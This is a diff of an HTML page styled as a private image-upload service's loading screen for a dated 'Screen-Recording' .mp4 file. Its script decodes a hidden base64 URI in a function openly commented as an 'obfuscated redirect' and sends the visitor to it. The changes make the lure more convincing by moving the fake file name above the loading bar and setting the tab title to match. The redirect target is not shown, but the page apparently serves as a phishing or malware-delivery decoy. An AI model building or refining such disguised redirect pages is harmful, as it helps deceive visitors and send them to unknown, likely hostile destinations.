@@ -5,7 +5,7 @@
 <meta content="Provided by Development Multiverse, the best private image uploading service!" property="og:description" />
 <meta content="#ff0000" data-react-helmet="true" name="theme-color" />
 <meta charset="UTF-8">
-<title>Loading Bar</title>
+<title>Loading Screen-Recording-DATE.mp4</title> <!-- Placeholder title, will be updated by script -->
 <style>
     body {
         background-color: #000; /* Black background */
@@ -17,9 +17,13 @@
         height: 100vh;
         margin: 0;
     }
+    #container {
+        text-align: center;
+        width: auto;
+    }
     #loadingBarContainer {
-        width: 80%;
-        max-width: 500px;
+        display: inline-block; /* Align the bar with the text width */
+        width: 100%;
         height: 20px;
         border: 1px solid #fff;
         border-radius: 10px; /* Rounded corners for the loading bar */
@@ -32,17 +36,16 @@
         transition: width 0.5s ease-out; /* Smooth transition for the loading effect */
     }
     #fileName {
-        text-align: center;
         margin-top: 20px;
     }
 </style>
 </head>
 <body>
-    <div>
+    <div id="container">
+        <p id="fileName">Loading Screen-Recording-DATE.mp4...</p>
         <div id="loadingBarContainer">
             <div id="loadingBar"></div>
         </div>
-        <p id="fileName">Loading Screen-Recording-DATE.mp4...</p>
     </div>
     <script>
         // Encoded URI
@@ -51,8 +54,8 @@
 
         // Obfuscated redirect function
         function redirectToPage() {
-        var decodedUri = atob(encodedUri); // Decode the base64 URI
-        window.location.href = decodedUri; // Perform the redirect
+            var decodedUri = atob(encodedUri); // Decode the base64 URI
+            window.location.href = decodedUri; // Perform the redirect
         }
         
         const fileNameElement = document.getElementById('fileName');
@@ -63,7 +66,9 @@
         const formattedDate = today.toISOString().slice(0, 10);
         
         // Update file name with today's date
-        fileNameElement.textContent = `Loading Screen-Recording-${formattedDate}.mp4...`;
+        const fileName = `Screen-Recording-${formattedDate}.mp4`;
+        fileNameElement.textContent = `Loading ${fileName}...`;
+        document.title = `Loading ${fileName}`; // Update the page title dynamically
 
         let width = 0;
         const interval = setInterval(() => {
